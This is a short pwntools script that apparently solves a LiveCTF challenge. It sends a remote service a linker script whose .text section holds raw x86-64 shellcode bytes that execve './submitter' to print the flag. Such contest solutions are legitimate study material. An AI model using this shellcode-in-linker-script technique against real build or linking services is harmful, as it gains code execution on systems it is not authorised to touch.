#!/usr/bin/env python3

from pwn import *

payload = """PHDRS
{
  headers      PT_PHDR PHDRS;
  header_load  PT_LOAD PHDRS;
  interp       PT_INTERP;
  code         PT_LOAD;
  data         PT_LOAD;
  dynamic      PT_DYNAMIC;
}
SECTIONS
{
  . = 0x80000;
  . = . + SIZEOF_HEADERS;
  .interp : { *(.interp) } :interp :headers :header_load
  . = ALIGN (0x400);
  .rela.dyn : { *(.rela.dyn) }
  .rela.plt : { *(.rela.plt) }
  . = ALIGN (0x400);
  .plt : { *(.plt) }
  .text : {
	_start = .;
BYTE(0x68);
BYTE(0x75);
BYTE(0x64);
BYTE(0x73);
BYTE(0x1);
BYTE(0x81);
BYTE(0x34);
BYTE(0x24);
BYTE(0x1);
BYTE(0x1);
BYTE(0x1);
BYTE(0x1);
BYTE(0x48);
BYTE(0xb8);
BYTE(0x2e);
BYTE(0x2f);
BYTE(0x73);
BYTE(0x75);
BYTE(0x62);
BYTE(0x6d);
BYTE(0x69);
BYTE(0x74);
BYTE(0x50);
BYTE(0x48);
BYTE(0x89);
BYTE(0xe7);
BYTE(0x31);
BYTE(0xd2);
BYTE(0x31);
BYTE(0xf6);
BYTE(0x6a);
BYTE(0x3b);
BYTE(0x58);
BYTE(0xf);
BYTE(0x5);
}
  . = ALIGN (0x1000);
  .dynamic : { *(.dynamic) } :data :dynamic
  .init_array : {
		. = ALIGN(4);
		__init_array_start = .;
		KEEP (*(SORT(.init_array.*)))
		KEEP (*(.init_array))
		__init_array_end = .;
	}
}
"""

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

r = remote(HOST, int(PORT))

r.sendline(payload.encode())

flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

# r.interactive()
